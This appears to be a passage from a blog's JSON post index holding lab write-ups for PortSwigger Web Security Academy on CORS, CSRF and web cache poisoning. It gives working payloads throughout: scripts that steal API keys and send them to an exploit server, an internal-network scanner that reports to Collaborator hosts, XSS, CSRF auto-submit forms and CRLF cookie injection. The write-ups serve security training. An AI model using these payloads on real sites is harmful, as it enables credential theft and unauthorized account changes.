Origin: canary.si, Response will include that domain in CORSAccess-Control-Allow-Origin: canary.siI’ve used following script to achieve that goal:&amp;lt;script&amp;gt;fetch(&quot;https://0a4700fd04d5c6d8c0997d1e000b0018.web-security-academy.net/accountDetails&quot;,{&quot;credentials&quot;:&quot;include&quot;}).then(res =&amp;gt; {return res.json()}).then(body =&amp;gt; { var apikey = body[&quot;apikey&quot;]; fetch (&quot;https://exploit-0a7900600492c601c0787c1101bb00b0.exploit-server.net/c=&quot;+apikey,{&quot;mode&quot;:&quot;no-cors&quot;});})&amp;lt;/script&amp;gt;This is solution proposed from Portswigger which uses XMLHttpRequest():&amp;lt;script&amp;gt; var req = new XMLHttpRequest(); req.onload = reqListener; req.open(&#39;get&#39;,&#39;YOUR-LAB-ID.web-security-academy.net/accountDetails&#39;,true); req.withCredentials = true; req.send(); function reqListener() { location=&#39;/log?key=&#39;+this.responseText; };&amp;lt;/script&amp;gt;CORS vulnerability with trusted null origin This website has an insecure CORS configuration in that it trusts the “null” origin. To solve the lab, craft some JavaScript that uses CORS to retrieve the administrator’s API key and upload the code to your exploit server. The lab is solved when you successfully submit the administrator’s API key. You can log in to your own account using the following credentials: wiener:peterThis web application is just like the previous one, just CORS accepts null origin.This is the payload that was used&amp;lt;iframe sandbox=&quot;allow-scripts allow-top-navigation allow-forms&quot; srcdoc=&quot;&amp;lt;script&amp;gt; var req = new XMLHttpRequest(); req.onload = reqListener; req.open(&#39;get&#39;,&#39;https://0a5b002b03d66285c15b953900c600c7.web-security-academy.net/accountDetails&#39;,true); req.withCredentials = true; req.send(); function reqListener() { location=&#39;exploit-0a6b00ee03b062d6c11c940701ad00ca.exploit-server.net/log?key=&#39;+encodeURIComponent(this.responseText); };&amp;lt;/script&amp;gt;&quot;&amp;gt;&amp;lt;/iframe&amp;gt;&amp;lt;iframe sandbox=&quot;allow-scripts allow-top-navigation allow-forms&quot; srcdoc=&quot;&amp;lt;script&amp;gt;fetch(&#39;https://0a6b00ee03b062d6c11c940701ad00ca.web-security-academy.net/accountDetails&#39;,{&#39;credentials&#39;:&#39;include&#39;}).then(res =&amp;gt; {return res.json()}).then(body =&amp;gt; { var apikey = body[&#39;apikey&#39;]; fetch (&#39;https://exploit-0a6b00ee03b062d6c11c940701ad00ca.exploit-server.net/c=&#39;+apikey,{&#39;mode&#39;:&#39;no-cors&#39;});})&amp;lt;/script&amp;gt;&quot;&amp;gt;&amp;lt;/iframe&amp;gt;CORS vulnerability with trusted insecure protocols This website has an insecure CORS configuration in that it trusts all subdomains regardless of the protocol. To solve the lab, craft some JavaScript that uses CORS to retrieve the administrator’s API key and upload the code to your exploit server. The lab is solved when you successfully submit the administrator’s API key. You can log in to your own account using the following credentials: wiener:peterdocLogin using provided credentials wiener:peter.Notice the Access-Control-Allow-Credentials: true. CORS seems to be in place.If we add Origin pointing to same lab’s subdomain, it will reflect in Access-Control-Allow-Origin header.We’ll take a note of that and try to find XSS so we can actually exploit CORS setting/vulnerability.Check stock will send a request to http://stock.LAB-ID.web-security-academy.net/?productId=2&amp;amp;storeId=1XSS is present in productId parameter as it simply reflect the provided “id” in the Error message:Alert fires as expected.Payload:&amp;lt;script&amp;gt; document.location=&quot;http://stock.0adc002b04a1979ac0f1efab00aa0062.web-security-academy.net/?productId=4&amp;lt;script&amp;gt;var req = new XMLHttpRequest(); req.onload = reqListener; req.open(&#39;get&#39;,&#39;https://0adc002b04a1979ac0f1efab00aa0062.web-security-academy.net/accountDetails&#39;,true); req.withCredentials = true;req.send();function reqListener() {location=&#39;https://exploit-0a1d004d045797b8c041ee4d01fb0039.exploit-server.net/log?key=&#39;%2bthis.responseText; };%3c/script&amp;gt;&amp;amp;storeId=1&quot;&amp;lt;/script&amp;gt;Payload above will be served on our exploit server. For better readability, this is the script that is provided into XSS payload&amp;lt;script&amp;gt;var req = new XMLHttpRequest(); req.onload = reqListener; req.open(&#39;get&#39;,&#39;https://0adc002b04a1979ac0f1efab00aa0062.web-security-academy.net/accountDetails&#39;,true); req.withCredentials = true;req.send();function reqListener() { location=&#39;https://exploit-0a1d004d045797b8c041ee4d01fb0039.exploit-server.net/log?key=&#39;%2bthis.responseText; };&amp;lt;/script&amp;gt;Victim should connect to our server unknowingly. We should see an entry with APIKey in our logs.CORS vulnerability with internal network pivot attackBURP Professional needed (collaborator) This website has an insecure CORS configuration in that it trusts all internal network origins. This lab requires multiple steps to complete. To solve the lab, craft some JavaScript to locate an endpoint on the local network (192.168.0.0/24, port 8080) that you can then use to identify and create a CORS-based attack to delete a user. The lab is solved when you delete user Carlos.This attack will have to be performed in few steps as we need to enumerate first, hence needing more than a single script.This is the code that will be used to enumerate the internal network. It will be copied to an exploit server and delivered to victim.&amp;lt;script&amp;gt;var q = [], collaboratorURL = &#39;http://jczxolrxtxilgme7dqz1sb1g57byzond.oastify.com&#39;;for(i=1;i&amp;lt;=255;i++) { q.push(function(url) { return function(wait) { fetchUrl(url, wait); } }(&#39;http://192.168.0.&#39;+i+&#39;:8080&#39;));}for(i=1;i&amp;lt;=20;i++){ if(q.length)q.shift()(i*100);}function fetchUrl(url, wait) { var controller = new AbortController(), signal = controller.signal; fetch(url, {signal}).then(r =&amp;gt; r.text().then(text =&amp;gt; { location = collaboratorURL + &#39;?ip=&#39;+url.replace(/^http:\\/\\//,&#39;&#39;)+&#39;&amp;amp;code=&#39;+encodeURIComponent(text)+&#39;&amp;amp;&#39;+Date.now(); })) .catch(e =&amp;gt; { if(q.length) { q.shift()(wait); } }); setTimeout(x =&amp;gt; { controller.abort(); if(q.length) { q.shift()(wait); } }, wait);}&amp;lt;/script&amp;gt;After some time HTTP request should hit our Collaborator instance:Next payload will check for XSS in the username field.&amp;lt;script&amp;gt;function xss(url, text, vector) { location = url + &#39;/login?time=&#39;+Date.now()+&#39;&amp;amp;username=&#39;+encodeURIComponent(vector)+&#39;&amp;amp;password=test&amp;amp;csrf=&#39;+text.match(/csrf&quot; value=&quot;([^&quot;]+)&quot;/)[1];}function fetchUrl(url, collaboratorURL){ fetch(url).then(r =&amp;gt; r.text().then(text =&amp;gt; { xss(url, text, &#39;&quot;&amp;gt;&amp;lt;img src=&#39;+collaboratorURL+&#39;?foundXSS=1&amp;gt;&#39;); }))}fetchUrl(&quot;http://192.168.0.145:8080&quot;, &quot;http://547jg7jjlja7886t5crnkxt2xt3krcf1.oastify.com&quot;);&amp;lt;/script&amp;gt;Next payload should leak the admin page.&amp;lt;script&amp;gt;function xss(url, text, vector) { location = url + &#39;/login?time=&#39;+Date.now()+&#39;&amp;amp;username=&#39;+encodeURIComponent(vector)+&#39;&amp;amp;password=test&amp;amp;csrf=&#39;+text.match(/csrf&quot; value=&quot;([^&quot;]+)&quot;/)[1];}function fetchUrl(url, collaboratorURL){ fetch(url).then(r=&amp;gt;r.text().then(text=&amp;gt; { xss(url, text, &#39;&quot;&amp;gt;&amp;lt;iframe src=/admin onload=&quot;new Image().src=\\&#39;&#39;+collaboratorURL+&#39;?code=\\&#39;+encodeURIComponent(this.contentWindow.document.body.innerHTML)&quot;&amp;gt;&#39;); } ))}fetchUrl(&quot;http://192.168.0.145:8080&quot;, &quot;http://2rug346g8gx4v5tqs9ek7ugzkqqhea2z.oastify.com&quot;);&amp;lt;/script&amp;gt;We get a callbackIn order to delete carlos we need to submit a form (including CSRF value).Next payload will do exactly that.&amp;lt;script&amp;gt;function xss(url, text, vector) { location = url + &#39;/login?time=&#39;+Date.now()+&#39;&amp;amp;username=&#39;+encodeURIComponent(vector)+&#39;&amp;amp;password=test&amp;amp;csrf=&#39;+text.match(/csrf&quot; value=&quot;([^&quot;]+)&quot;/)[1];}function fetchUrl(url){ fetch(url).then(r=&amp;gt;r.text().then(text=&amp;gt; { xss(url, text, &#39;&quot;&amp;gt;&amp;lt;iframe src=/admin onload=&quot;var f=this.contentWindow.document.forms[0];if(f.username)f.username.value=\\&#39;carlos\\&#39;,f.submit()&quot;&amp;gt;&#39;); } ))}fetchUrl(&quot;http://192.168.0.145:8080&quot;);&amp;lt;/script&amp;gt;We’re now not expecting a callback but Congratulations, you solved the lab! message!" }, { "title": "(Portswigger/WebAcademy) - Cross-Site Request Forgery (CSRF)", "url": "/posts/CSRF/", "categories": "Web Application, Cross-Site Request Forgery", "tags": "Notes, Web Application, Portswigger", "date": "2022-12-12 08:00:00 +0100", "snippet": "IntroThis post/writeup is all about the Cross-Site Request Forgery.I’ll be using primarily Portswigger Web Academy Labs, but i do intent do throw other labs and writeups here as well.To learn more on the topic, please visit the article linked above at Portswigger’s.TOC Intro TOC CSRF vulnerability with no defenses CSRF where token validation depends on request method CSRF where token validation depends on token being present CSRF where token is not tied to user session CSRF where token is tied to non-session cookie CSRF where token is duplicated in cookie CSRF where Referer validation depends on header being present CSRF with broken Referer validationCSRF vulnerability with no defenses This lab’s email change functionality is vulnerable to CSRF. To solve the lab, craft some HTML that uses a CSRF attack to change the viewer’s email address and upload it to your exploit server. You can log in to your own account using the following credentials: wiener:peterThis is how the lab’s web page looks like. It’s a blog but with logon option.Keep in mind that in this lab, delivering the payload to victim is done simply by clicking the button. We’re dealing with exploiting CSRF only!Let’s login using provided credentials wiener:peter.We can change the email and send check the request in Burp.POST /my-account/change-email HTTP/1.1Host: 0ab500a404d955f1c21131ce00500007.web-security-academy.netCookie: session=xFmhDnag2IDZr2PCyqFS0gyunrHVTtkpUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:107.0) Gecko/20100101 Firefox/107.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8Accept-Language: en-US,en;q=0.5Accept-Encoding: gzip, deflateContent-Type: application/x-www-form-urlencodedContent-Length: 27Origin: https://0ab500a404d955f1c21131ce00500007.web-security-academy.netReferer: https://0ab500a404d955f1c21131ce00500007.web-security-academy.net/my-accountUpgrade-Insecure-Requests: 1Sec-Fetch-Dest: documentSec-Fetch-Mode: navigateSec-Fetch-Site: same-originSec-Fetch-User: ?1Te: trailersConnection: closeemail=hey%40normal-user.netAs a login user we have a session token. SameSite attribute is not being used!This is the template that i’ll use for this lab. It’s a simple form that changes the email to something else.&amp;lt;form method=&quot;POST&quot; action=&quot;https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email&quot;&amp;gt; &amp;lt;input type=&quot;hidden&quot; name=&quot;email&quot; value=&quot;anything@web-security-academy.net&quot;&amp;gt;&amp;lt;/form&amp;gt;&amp;lt;script&amp;gt; document.forms[0].submit();&amp;lt;/script&amp;gt;We now simply click on Deliver exploit to victim and in the background, the email of wiener’s should have been changed. We can check access log if the form has been visited by a victim.It should be clear by now that having no CSRF defenses is not a good idea!CSRF where token validation depends on request method This lab’s email change functionality is vulnerable to CSRF. It attempts to block CSRF attacks, but only applies defenses to certain types of requests. To solve the lab, use your exploit server to host an HTML page that uses a CSRF attack to change the viewer’s email address. You can log in to your own account using the following credentials: wiener:peterPage looks indentical as seen above. We can login using wiener:peter and change an email. This is captured request (I’ve deleted few non-relevant headers):POST /my-account/change-email HTTP/1.1Host: 0ad9005c03111f09c097041f00bf0010.web-security-academy.netCookie: session=8gJDTnMZWjsviceaBy16qVHSXfaqLOZf...Origin: https://0ad9005c03111f09c097041f00bf0010.web-security-academy.netReferer: https://0ad9005c03111f09c097041f00bf0010.web-security-academy.net/my-account...Connection: closeemail=asd%40normal-user.net&amp;amp;csrf=ZsSzUXhTgY9TZ3c6GZeavES14EQDiDArI’ll send request to Responder and try with same CSRF token and without. I can change the email again using same token.If i remove the csrf= parameter and/or it’s value i’d see &quot;Missing parameter &#39;csrf&#39;&quot;.What if we send GET request instead?Yep, that’ll work and CSRF token won’t get checked.Following Payload can be applied which will cause GET request to be sent from the victim&amp;lt;form action=&quot;https://0ae500a50484da0fc20b17a4007600fe.web-security-academy.net/my-account/change-email&quot;&amp;gt; &amp;lt;input type=&quot;hidden&quot; name=&quot;email&quot; value=&quot;anything@web-security-academy.net&quot;&amp;gt;&amp;lt;/form&amp;gt;&amp;lt;script&amp;gt; document.forms[0].submit();&amp;lt;/script&amp;gt;CSRF where token validation depends on token being present This lab’s email change functionality is vulnerable to CSRF. To solve the lab, use your exploit server to host an HTML page that uses a CSRF attack to change the viewer’s email address. You can log in to your own account using the following credentials: wiener:peterOnly difference here compatered to previous labs is that when we remove csrf token entirely, we’ll be able to change the email.CSRF token will not be checked if not present in the request.In order to solve the lab, we have to login, change the email, capture that request and remove the CSRF parameter from the POST request.POST /my-account/change-email HTTP/1.1Host: 0a4a002e04958d54c160c28800b500a0.web-security-academy.netCookie: session=Uj3Z174TrfQHhs4Ba9POcmOSyE8htiUX...Accept-Encoding: gzip, deflateContent-Type: application/x-www-form-urlencodedContent-Length: 28Origin: https://0a4a002e04958d54c160c28800b500a0.web-security-academy.netReferer: https://0a4a002e04958d54c160c28800b500a0.web-security-academy.net/my-accountUpgrade-Insecure-Requests: 1...Te: trailersConnection: closeemail=asdd%40normal-user.netThis is what we’ll deliver to the victim using Deliver exploit to victim button on our exploit server.&amp;lt;form method=&quot;POST&quot; action=&quot;https://0a4a002e04958d54c160c28800b500a0.web-security-academy.net/my-account/change-email&quot;&amp;gt; &amp;lt;input type=&quot;hidden&quot; name=&quot;email&quot; value=&quot;anything@web-security-academy.net&quot;&amp;gt;&amp;lt;/form&amp;gt;&amp;lt;script&amp;gt; document.forms[0].submit();&amp;lt;/script&amp;gt;CSRF where token is not tied to user session This lab’s email change functionality is vulnerable to CSRF. It uses tokens to try to prevent CSRF attacks, but they aren’t integrated into the site’s session handling system. To solve the lab, use your exploit server to host an HTML page that uses a CSRF attack to change the viewer’s email address. You have two accounts on the application that you can use to help design your attack. The credentials are as follows: wiener:peter carlos:montoya In this lab we’ll login as wiener and carlos (two different browsers or using incognito mode) and we’ll try to swap the CSRF tokens and check if they’re bound to user or not. If not, we can just send our CSRF token to victim and email change should work.Success. Only thing that we have to pay attention to is that CSRF token can be used only once!Let’s deliver the payload to the victim.We have to refresh the page and use the fresh, unused token, or change the email using wiener or carlos and intercept the request, grab the token and drop the request afterwards.&amp;lt;form method=&quot;POST&quot; action=&quot;https://0a9300a403fc868dc0d03bd1009d007c.web-security-academy.net/my-account/change-email&quot;&amp;gt; &amp;lt;input type=&quot;hidden&quot; name=&quot;email&quot; value=&quot;anything@web-security-academy.net&quot;&amp;gt;&amp;lt;input type=&quot;hidden&quot; name=&quot;csrf&quot; value=&quot;zQwm5Fz16qcy4aZ80oCSRagNpkNYVnCT&quot;&amp;gt;&amp;lt;/form&amp;gt;&amp;lt;script&amp;gt; document.forms[0].submit();&amp;lt;/script&amp;gt;Lab has been solved.CSRF where token is tied to non-session cookie This lab’s email change functionality is vulnerable to CSRF. It uses tokens to try to prevent CSRF attacks, but they aren’t fully integrated into the site’s session handling system. To solve the lab, use your exploit server to host an HTML page that uses a CSRF attack to change the viewer’s email address. You have two accounts on the application that you can use to help design your attack. The credentials are as follows: wiener:peter carlos:montoya This problem where token is tied to a non-session cookie might happen when the web app deploys two different frameworks which don’t interact efficently with each other - in regards of CSRF.If we use wiener for testing and take csrfKey and csrf parameter from carlos, we’ll bypass CSRF protection succesfully.Now how we can deliver that?This lab acts weird when we start search like this/?search=test%0d%0aSet-Cookie:%20csrfKey=wqVM7TKrfyTIhKMenMYcMc96RGP6DX6v%3b%20SameSite=NoneServer responds withHTTP/1.1 200 OKSet-Cookie: LastSearchTerm=testSet-Cookie: csrfKey=wqVM7TKrfyTIhKMenMYcMc96RGP6DX6v; SameSite=None; Secure; HttpOnlyContent-Type: text/html; charset=utf-8Connection: closeContent-Length: 3215We can send a csrfKey, or better said, reflect it to the victim.I’ll use payload that was proposed in solution as well. We have to ditch the script and rather use img tag instead, to make reflection work!&amp;lt;form method=&quot;POST&quot; action=&quot;https://0a5300d20416d3fcc016e18b001800a7.web-security-academy.net/my-account/change-email&quot;&amp;gt; &amp;lt;input type=&quot;hidden&quot; name=&quot;email&quot; value=&quot;anything@web-security-academy.net&quot;&amp;gt;&amp;lt;input type=&quot;hidden&quot; name=&quot;csrf&quot; value=&quot;N1emx758Z7WvJCyVpuDvJIDd1Gtl3D9Q&quot;&amp;gt;&amp;lt;/form&amp;gt;&amp;lt;img src=&quot;https://0a5300d20416d3fcc016e18b001800a7.web-security-academy.net/?search=test%0d%0aSet-Cookie:%20csrfKey=y8QhVUO6h50Ing529s6rMEqhS1ySAAqn%3b%20SameSite=None&quot; onerror=&quot;document.forms[0].submit()&quot;&amp;gt;CSRF where token is duplicated in cookie This lab’s email change functionality is vulnerable to CSRF. It attempts to use the insecure “double submit” CSRF prevention technique. To solve the lab, use your exploit server to host an HTML page that uses a CSRF attack to change the viewer’s email address. You can log in to your own account using the following credentials: wiener:peterIn this lab we have the same values in the cookia an in the requestPOST /my-account/change-email HTTP/1.1Host: 0aef0089046807e7c06dccfb00dc00ae.web-security-academy.netCookie: csrf=H2kkj4Hk3A1z3sdIS5z3etffUqbplagI; session=8wqk16y4qG1WBQSFCiq0Oz0vOq259TJ1User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:107.0) Gecko/20100101 Firefox/107.0...Content-Type: application/x-www-form-urlencodedContent-Length: 65Origin: https://0aef0089046807e7c06dccfb00dc00ae.web-security-academy.netReferer: https://0aef0089046807e7c06dccfb00dc00ae.web-security-academy.net/my-accountUpgrade-Insecure-Requests: 1...Te: trailersConnection: closeemail=asd%40normal-user.net&amp;amp;csrf=H2kkj4Hk3A1z3sdIS5z3etffUqbplagIIf we send request to search endpoint which is known to set cookie for the lastSearch, but we can add csrf cookie as well!/?search=test%0d%0aSet-Cookie:%20csrf=spoof and response:HTTP/1.1 200 OKSet-Cookie: LastSearchTerm=testSet-Cookie: csrf=spoof; Secure; HttpOnlyCSRF token is set to our spoofed value and it stays the same.We can deliver similar payload as in previous lab&amp;lt;form method=&quot;POST&quot; action=&quot;https://0aef0089046807e7c06dccfb00dc00ae.web-security-academy.net/my-account/change-email&quot;&amp;gt; &amp;lt;input type=&quot;hidden&quot; name=&quot;email&quot; value=&quot;anything@web-security-academy.net&quot;&amp;gt;&amp;lt;input type=&quot;hidden&quot; name=&quot;csrf&quot; value=&quot;spoof&quot;&amp;gt;&amp;lt;/form&amp;gt;&amp;lt;img src=&quot;https://0aef0089046807e7c06dccfb00dc00ae.web-security-academy.net/?search=test%0d%0aSet-Cookie:%20csrf=spoof%3b%20SameSite=None&quot; onerror=&quot;document.forms[0].submit();&quot;/&amp;gt;CSRF where Referer validation depends on header being present This lab’s email change functionality is vulnerable to CSRF. It attempts to block cross domain requests but has an insecure fallback. To solve the lab, use your exploit server to host an HTML page that uses a CSRF attack to change the viewer’s email address. You can log in to your own account using the following credentials: wiener:peterIn this lab we’re supposed to change the email from the victim. If we log in we and change the email, request will be send like this (I’ve removed some irelevant headers):POST /my-account/change-email HTTP/1.1Host: 0acc007a0407b9cdc0166311009f004e.web-security-academy.netCookie: session=XQrmFJwOd7sZAGjGr6IlA7Uxx149kezF...Content-Type: application/x-www-form-urlencodedContent-Length: 28Origin: https://0acc007a0407b9cdc0166311009f004e.web-security-academy.netReferer: https://0acc007a0407b9cdc0166311009f004e.web-security-academy.net/my-accountUpgrade-Insecure-Requests: 1...Pragma: no-cacheCache-Control: no-cacheTe: trailersConnection: closeemail=asdd%40normal-user.netEmail will be changed, if we however change referrer to our exploit address, we’ll see Invalid referer header. If we remove referrer header entirely, we’ll be able to change the email again.We can deliver payload as we’ve done it before, just this time by using &amp;lt;meta name=&quot;referrer&quot; content=&quot;no-referrer&quot;&amp;gt; which won’t forward the header to the web server in the CSRF request.&amp;lt;meta name=&quot;referrer&quot; content=&quot;no-referrer&quot;&amp;gt;&amp;lt;form method=&quot;POST&quot; action=&quot;https://0acc007a0407b9cdc0166311009f004e.web-security-academy.net/my-account/change-email&quot;&amp;gt; &amp;lt;input type=&quot;hidden&quot; name=&quot;email&quot; value=&quot;anything@web-security-academy.net&quot;&amp;gt;&amp;lt;/form&amp;gt;&amp;lt;img src=x onerror=&quot;document.forms[0].submit();&quot;/&amp;gt;CSRF with broken Referer validation This lab’s email change functionality is vulnerable to CSRF. It attempts to detect and block cross domain requests, but the detection mechanism can be bypassed. To solve the lab, use your exploit server to host an HTML page that uses a CSRF attack to change the viewer’s email address. You can log in to your own account using the following credentials: wiener:peterThis lab looks like the previous ones. We login using provided credentials wiener:peter and change the email and send this change request to repeater.After fiddling with the Referrer header, request will be accepted if it contains the URL. If i use URL from exploit server, request won’t be accepted anymore.Problem arises how to spoof referrer header using reflection in victims browser.This is one of the ways how the labs can be done.&amp;lt;meta name=&quot;referrer&quot; content=&quot;unsafe-url&quot;&amp;gt;&amp;lt;script&amp;gt;history.pushState(&quot;&quot;, &quot;&quot;, &quot;/?c=https://0ab4007d03078aecc0dab49e00b000a3.web-security-academy.net/my-account&quot;)&amp;lt;/script&amp;gt;&amp;lt;form method=&quot;POST&quot; action=&quot;https://0ab4007d03078aecc0dab49e00b000a3.web-security-academy.net/my-account/change-email&quot;&amp;gt; &amp;lt;input type=&quot;hidden&quot; name=&quot;email&quot; value=&quot;anything@web-security-academy.net&quot;&amp;gt;&amp;lt;/form&amp;gt;&amp;lt;img src=x onerror=&quot;document.forms[0].submit();&quot;/&amp;gt;Mind the Referrer using unsafe-url and history.pushState! All the labs look opticaly the same so i didn’t make that many screenshots, so appologies for that!" }, { "title": "(Portswigger/WebAcademy) - Web Cache Poisoning (Unkeyed Inputs)", "url": "/posts/Web_Cache_Poisoning/", "categories": "Web Application, Web Cache Poisoning", "tags": "Notes, Web Application, Portswigger", "date": "2022-10-27 09:00:00 +0200", "snippet": "IntroThis post/writeup is all about the Web Cache Poisoning.I’ll be using primarily Portswigger Web Academy Labs, but i do intent do throw other labs and writeups here as well.To learn more on the topic, please visit the article linked above at Portswigger’s. I also recommend reading Practical Web Cache Poisoning Article.TOC Intro TOC Web cache poisoning with an unkeyed header Web cache poisoning with an unkeyed cookie Web cache poisoning with multiple headers Targeted web cache poisoning using an unknown header Web cache poisoning to exploit a DOM vulnerability via a cache with strict cacheability criteria Combining web cache poisoning vulnerabilitiesWeb cache poisoning with an unkeyed header This lab is vulnerable to web cache poisoning because it handles input from an unkeyed header in an unsafe way. An unsuspecting user regularly visits the site’s home page. To solve this lab, poison the cache with a response that executes alert(document.cookie) in the visitor’s browser.We start with the Shop pageLet’s check the request(s) in Burp.We can already tell that we’re caching is active on the webserver (X-Cache header is present along with Age and Cache-Control&#39;)Can we poison the Cache?Yes we can, using X-Forwarded-Host. Make sure to get rid of path that get’s appended afterwards (mind the #).Lab has been solved. PS: You can also check the Access Logs to see if Victim has been connecting to exploit server or not.Web cache poisoning with an unkeyed cookie This lab is vulnerable to web cache poisoning because cookies aren’t included in the cache key. An unsuspecting user regularly visits the site’s home page. To solve this lab, poison the cache with a response that executes alert(1) in the visitor’s browser.The page looks same as in the lab before. If we take a look at the requests we’ll see fehost cookie, and it’s value gets reflected to the response.If we carefully check how the values gets translated into response, we can come up with something like that:We just need to trigger alert(1) that has been put into cache. TTL is again 30 seconds.Web cache poisoning with multiple headers This lab contains a web cache poisoning vulnerability that is only exploitable when you use multiple headers to craft a malicious request. A user visits the home page roughly once a minute. To solve this lab, poison the cache with a response that executes alert(document.cookie) in the visitor’s browser.Page looks exacly the same as in the previous labs. This lab however needed more fiddling with the headrers and was not so straightforward as the previous labs.Main difference here is when X-Forwarded-Scheme: http is used, server answers with 302If we use X-Forwarded-Host as well, we get 302 redirection to our exploitCraft the payload accordingly (alert(document.cookie)), and also make sure to disable the path that get’s appended to Location.You can use Access Logs to see if Victim has made a connection or not. If everything was done right, lab should be solved!Targeted web cache poisoning using an unknown header This lab is vulnerable to web cache poisoning. A victim user will view any comments that you post. To solve this lab, you need to poison the cache with a response that executes alert(document.cookie) in the visitor’s browser. However, you also need to make sure that the response is served to the specific subset of users to which the intended victim belongs.In this lab when we load the page, we see Vary header in the response, which implies that caching should be User Agent based. At least that was my understanding when solving this particular lab.If we start Param-miner Burp extension, it should return 2 headers back to us. Origin is most like not unkeyed though in the cache.Loaded Param Miner v1.4dUpdating active thread pool size to 8Queued 1 attacksInitiating header bruteforce on 0ab600840368b45fc045a7e8004f00ee.web-security-academy.netIdentified parameter on 0ab600840368b45fc045a7e8004f00ee.web-security-academy.net: x-hostIdentified parameter on 0ab600840368b45fc045a7e8004f00ee.web-security-academy.net: origin~https://%s.%hIdentified parameter on 0ab600840368b45fc045a7e8004f00ee.web-security-academy.net: originAnd indeed, X-Host does reflect itself in the response.Now we’ll need a XSS to effiecently exploit our victim as we need to know what User-Agent it is being used.We can post a comment under any post like a simple image&amp;lt;img src=&quot;exploit-server&quot; /&amp;gt;You should receive a callback from victim with it’s User-Agent.Now let’s try to poison webcache.We need to change payload accordingly on our exploit server =&amp;gt; alert(document.cookie). When we poison the Cache, don’t forget to change the User-Agent.Web cache poisoning to exploit a DOM vulnerability via a cache with strict cacheability criteria This lab contains a DOM-based vulnerability that can be exploited as part of a web cache poisoning attack. A user visits the home page roughly once a minute. Note that the cache used by this lab has stricter criteria for deciding which responses are cacheable, so you will need to study the cache behavior closely. To solve the lab, poison the cache with a response that executes alert(document.cookie) in the visitor’s browser.Let’s browse the site first. The Param Miner extension returned X-Forwarded-Host as being reflected in response.It relects itself as value in JSON format, enclosed in &amp;lt;script&amp;gt;.We need to scroll further down in the source code to find out where the data.host is actually being called. &amp;lt;script&amp;gt; initGeoLocate(&#39;//&#39; + data.host + &#39;/resources/json/geolocate.json&#39;); &amp;lt;/script&amp;gt;data.host is not being sanitized in any way.Access log shows that we’re hitting the exploit server.84.138.97.163 2022-11-26 12:09:08 +0000 &quot;GET /exploit/?=/resources/json/geolocate.json HTTP/1.1&quot; 200 &quot;User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:107.0) Gecko/20100101 Firefox/107.0&quot;If we check the initGeoLocate function we will also see that our input is being put directly into div as valueWe also need to bypass CORS, as if we try to load remote resource we’ll see CORS error Cross-Origin Request Blocked.Access-Control-Allow-Origin: *This is what i’ve used on the exploit server.If everything has been done right, we should get an alert in OUR browser. I’ve poisonied more that 1 product though and the / in order to solve the lab!Combining web cache poisoning vulnerabilities This lab is susceptible to web cache poisoning, but only if you construct a complex exploit chain. A user visits the home page roughly once a minute and their language is set to English. To solve this lab, poison the cache with a response that executes alert(document.cookie) in the visitor’s browser.This labs needs combining two vulnerabilities togheter where we actually have to poison the cache on two places.I’ve started Param Miner on / and /?localized=1 (actually on other endpoits well, but the ones mentioned are relevant!) / returned X-Forwarded-Host and X-original-url /localised=1 returned X-original-urlIn order to even find the endpoints/paths i simply browsed the page.We now know where the potential Web Cache Vulnerability might be.We can notice that host is being reflected being sent into following script&amp;lt;script&amp;gt; initTranslations(&#39;//&#39; + data.host + &#39;/resources/json/translations.json&#39;);&amp;lt;/script&amp;gt;File translations.json looks like this (it was already modified by me, only the español){ &quot;en&quot;: { &quot;name&quot;: &quot;English&quot; }, &quot;es&quot;: { &quot;name&quot;: &quot;español&quot;, &quot;translations&quot;: { &quot;Return to list&quot;: &quot;its just on the product page :(&quot;, &quot;View details&quot;: &quot;&amp;lt;/a&amp;gt;&amp;lt;img src=1 onerror=&#39;alert(document.cookie)&#39; /&amp;gt;&quot;, &quot;Description:&quot;: &quot;Descripción:&quot; } }, &quot;cn&quot;: { &quot;name&quot;: &quot;中文&quot;, &quot;translations&quot;: { &quot;Return to list&quot;: &quot;返回清單&quot;, &quot;View details&quot;: &quot;查看詳情&quot;, &quot;Description:&quot;: &quot;描述:&quot; } }, &quot;ar&quot;: { &quot;name&quot;: &quot;عربى&quot;, &quot;translations&quot;: { &quot;Return to list&quot;: &quot;العودة إلى القائمة&quot;, &quot;View details&quot;: &quot;عرض التفاصيل&quot;, &quot;Description:&quot;: &quot;وصف:&quot; } }, &quot;en-gb&quot;: { &quot;name&quot;: &quot;Proper English&quot;, &quot;translations&quot;: { &quot;Return to list&quot;: &quot;From whence you came&quot;, &quot;View details&quot;: &quot;Do me the honour of elaborating&quot;, &quot;Description:&quot;: &quot;Pontifications on the subject matter:&quot; } }, &quot;ml&quot;: { &quot;name&quot;: &quot;മലയാളം&quot;, &quot;translations&quot;: { &quot;Return to list&quot;: &quot;ലിസ്റ്റിലേക്ക് മടങ്ങുക&quot;, &quot;View details&quot;: &quot;വിശദാംശങ്ങൾ കാണുക&quot;, &quot;Description:&quot;: &quot;വിവരണം:&quot; } }, &quot;hb&quot;: { &quot;name&quot;: &quot;עברית&quot;, &quot;translations&quot;: { &quot;Return to list&quot;: &quot;חזור לרשימה&quot;, &quot;View details&quot;: &quot;הצג פרטים&quot;, &quot;Description:&quot;: &quot;תיאור:&quot; } }, &quot;zl&quot;: { &quot;name&quot;: &quot;Ẕ̻͕̿̊ͤ̍ͅa͙l̗ͧg̮̤̰̘͇ȍ͇͕̳̙͙͉́̅̋̌̅&quot;, &quot;translations&quot;: { &quot;Return to list&quot;: &quot;Re̹̰̘͉̹̪ͅt̬̫̜ȕͩ͒ͥͥr̃̉͒n ̎͂t͎͖̽͋o͖̟͚͙̲͐ͤͫ̎̓ ̼̟͈̭͉͎̂ͯ̔ͤͤ̏͐ͅliͤ͑ͧ̆̐̈̀sṭ̠̮̰͍̙͒̔͆̈ͤ̅&quot;, &quot;View details&quot;: &quot;V̖̮͙ͅi͇e͙̦w̭̣̫͇̦̬̰ ̓͑̓ͯ̔d͍͂e͚̮͖͍͖̠͙ͮͭ̉ͦ̏͌̆t̙͎̺͉a̳̖͔̱͉̱͑̆̌̃͊ͬi̯͚͙̼̹̮l̖͎͛̈́͒ͅs̒̒ͤ̽̒̀&quot;, &quot;Description:&quot;: 